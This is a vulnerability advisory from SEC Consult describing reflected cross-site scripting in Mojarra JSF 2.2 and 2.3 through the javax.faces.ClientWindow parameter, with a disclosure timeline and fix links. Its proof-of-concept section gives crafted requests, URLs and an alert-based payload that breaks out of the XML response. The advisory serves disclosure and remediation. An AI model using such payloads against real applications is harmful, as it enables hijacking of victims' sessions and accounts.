@@ -1,0 +1,189 @@
+id: 33266
+date: 09/22/2019
+title: Oracle Mojarra JSF / Eclipse Mojarra JSF 2.2 / 2.3 Cross Site Scripting Vulnerability
+author: Guillaume Crouquet
+cves: 
+
+=======================================================================
+              title: Reflected Cross-Site Scripting (XSS)
+            product: Oracle Mojarra JSF included in Java EE 7
+                     Eclipse Mojarra JSF
+ vulnerable version: 2.2 & 2.3
+      fixed version: https://github.com/javaserverfaces/mojarra/commits/MOJARRA_2_2X_ROLLING
+                     https://github.com/javaserverfaces/mojarra/commits/MOJARRA_2_3X_ROLLING
+                     https://github.com/eclipse-ee4j/mojarra
+         CVE number: -
+             impact: Medium
+           homepage: https://javaserverfaces.github.io/
+              found: 2018-11-12
+                 by: Jean-Benjamin Rousseau (Office Zurich)
+                     Guillaume Crouquet (Office Zurich)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"JavaServer Faces technology simplifies building user interfaces for
+JavaServer applications. Developers can build web applications by
+assembling reuseable UI components in a page; connecting these
+components to an application data source; and wiring client-generated
+events to server-side event handlers.  This project provides information
+on the continued development of the JavaServer Faces specification.
+
+JavaServer Faces (JSF) is a JCP Standard technology for authoring
+component based user interfaces on the Java EE platform."
+
+Source: https://javaee.github.io/javaserverfaces-spec/
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerability documented in this advisory, an attacker
+can execute arbitrary scripts in the context of the web application in the
+victim's browser. Besides performing arbitrary actions within the
+application with the victim's account or manipulating the application's
+interface, the attacker can potentially steal session tokens, redirect
+the victim to external pages and perform attacks against their browser.
+
+SEC Consult recommends users to implement the available patches.
+
+
+Vulnerability overview/description:
+-----------------------------------
+The Mojarra implementation of JavaServer Faces (JSF) v2.2 and v2.3
+lacks input validation on the javax.faces.ClientWindow parameter which can
+lead to reflected cross-site scripting (XSS) under certain conditions.
+
+Mojarra JSF v2.2 and v2.3 are respectively the user interface
+standards for Java EE 7 and Java EE 8.
+
+The vulnerability is not directly exploitable in Mojarra JSF v2.2
+and v2.3. However, different frameworks based on this library and having
+a custom implementation of the Faces-Request HTTP headers for AJAX requests
+might be affected. PrimeFaces v6.0 is one example of a vulnerable framework.
+
+This vulnerability affects the web applications fulfilling the following
+conditions:
+ - Usage of a framework based on Mojarra JSF v2.2 or v2.3
+ - Usage of AJAX requests in the web applications
+ - Custom implementation of the Faces-Request HTTP headers for AJAX requests
+ - Presence of the javax.faces.CLIENT_WINDOW_MODE context parameter
+   set to "url" in the web.xml file:
+
+<context-param>
+  <param-name>javax.faces.CLIENT_WINDOW_MODE</param-name>
+  <param-value>url</param-value>
+</context-param>
+
+
+Proof of concept:
+-----------------
+In this proof of concept, the tests are based on PrimeFaces v6.0,
+an open source framework for JSF. Other frameworks based on
+Mojarra JSF 2.2 or 2.3 might also be affected.
+
+Step 1: Generate an AJAX request on the web application and intercept it.
+-----------
+POST /HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0 HTTP/1.1
+Host: $IP
+Content-Length: 405
+Accept: application/xml, text/xml, */*; q=0.01
+Origin: http://$IP
+X-Requested-With: XMLHttpRequest
+Faces-Request: partial/ajax
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=2a616ef87aeed7521b02ceb4e163
+Connection: close
+
+javax.faces.partial.ajax=true&javax.faces.source=j_idt18%3AbtnSurname&javax.faces.partial.execute=j_idt18%3AbtnSurname+j_idt18%3Asurname&javax.faces.partial.render=j_idt18%3Agrid&j_idt18%3AbtnSurname=j_idt18%3AbtnSurname&j_idt18=j_idt18&j_idt18%3Afirstname=&j_idt18%3Asurname=surname&javax.faces.ViewState=7025249133904776332%3A-921340693957557245&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
+-----------
+
+Step 2: Transpose the POST parameters into GET parameters and
+build a new URL with it.
+
+http://$IP/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j_idt18%3AbtnSurname&javax.faces.partial.execute=j_idt18%3AbtnSurname+j_idt18%3Asurname&javax.faces.partial.render=j_idt18%3Agrid&j_idt18%3AbtnSurname=j_idt18%3AbtnSurname&j_idt18=j_idt18&j_idt18%3Afirstname=&j_idt18%3Asurname=surname&javax.faces.ViewState=7025249133904776332%3A-921340693957557245&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
+
+
+Step 3: Strip out the javax.faces.ViewState GET parameter from the URL.
+
+http://localhost:8080/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j_idt18%3AbtnSurname&javax.faces.partial.execute=j_idt18%3AbtnSurname+j_idt18%3Asurname&javax.faces.partial.render=j_idt18%3Agrid&j_idt18%3AbtnSurname=j_idt18%3AbtnSurname&j_idt18=j_idt18&j_idt18%3Afirstname=&j_idt18%3Asurname=surname&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
+
+
+Step 4: Prefix the javax.faces.ClientWindow GET parameter with
+the following PoC payload:
+
+]]></update><something%3ascript+xmlns%3asomething%3d"http%3a//www.w3.org/1999/xhtml">alert('SEC
+Consult')</something%3ascript><update+id%3d"j_id1%3ajavax.faces.ClientWindow%3a0"><![CDATA[
+
+Resulting URL:
+
+http://$IP/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j_idt18%3AbtnSurname&javax.faces.partial.execute=j_idt18%3AbtnSurname+j_idt18%3Asurname&javax.faces.partial.render=j_idt18%3Agrid&j_idt18%3AbtnSurname=j_idt18%3AbtnSurname&j_idt18=j_idt18&j_idt18%3Afirstname=&j_idt18%3Asurname=surname&javax.faces.ClientWindow=]]></update><something%3ascript+xmlns%3asomething%3d"http%3a//www.w3.org/1999/xhtml">alert('SEC+Consult')</something%3ascript><update+id%3d"j_id1%3ajavax.faces.ClientWindow%3a0"><![CDATA[2a616ef87aeed7521b02ceb4e163%3A0
+
+
+Step 5: To trigger the XSS, the victim just needs to browse to the crafted link
+of step 4.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested:
+* Mojarra JSF v2.2 included in Java EE 7
+* Mojarra JSF v2.3 included in Java EE 8 has not been tested
+  but is affected according to the vendor
+
+
+Vendor contact timeline:
+------------------------
+Oracle:
+2018-11-22: Contacting vendor through secalert_us@oracle.com
+2018-11-27: Initial response from Oracle. Monthly updates will be
+            provided until the issue is addressed.
+2018-12-15: Request from Oracle for technical details.
+2018-12-17: Response with requested details
+            Error in the transmission of the e-mail.
+2019-01-11: Request from Oracle to delay the release date
+            when a fix will be provided.
+2019-01-15: Extension of the release and retransmission of the technical
+            details from the previous mail.
+2019-02-01: Request from Oracle to extend the release date after
+            the 16th of April 2019.
+2019-02-04: Extension of the release date.
+2019-02-05: Acknowledgment of receipt from Oracle.
+2019-04-11: Release of a fix for versions 2.2 and 2.3 of Oracle Mojarra JSF
+2019-04-29: SEC Consult: fix is incomplete and only filters script tags, request
+            for a CVE number and credits.
+2019-04-30: Request from Oracle for details for crediting
+2019-04-30: Provision of details from SEC Consult
+2019-05-07: Confirmation of credits in the Oracle Critical Patch Update
+            Advisory - April 2019
+2019-08-30: Confirmation by Oracle that a patch has been applied
+
+
+Eclipse:
+2019-06-13: Contacting vendor through bugs.eclipse.org
+2019-08-23: Project lead replied that he will take care of this issue
+2019-08-28: Ask for an update with no response
+
+2019-09-18: Release of security advisory
+
+
+Solution:
+---------
+Oracle has addressed the reported issue for the versions 2.2 and 2.3:
+https://github.com/javaserverfaces/mojarra/commits/MOJARRA_2_2X_ROLLING
+https://github.com/javaserverfaces/mojarra/commits/MOJARRA_2_3X_ROLLING
+
+JSF is part of Java EE SDK, but Java EE is not a supported product, so
+Oracle will not be announcing the fixes through their Critical Patch Update.
+
+Eclipse has also been contacted, but no patch has been confirmed yet.
+
+#  0day.today [2023-03-22]  #
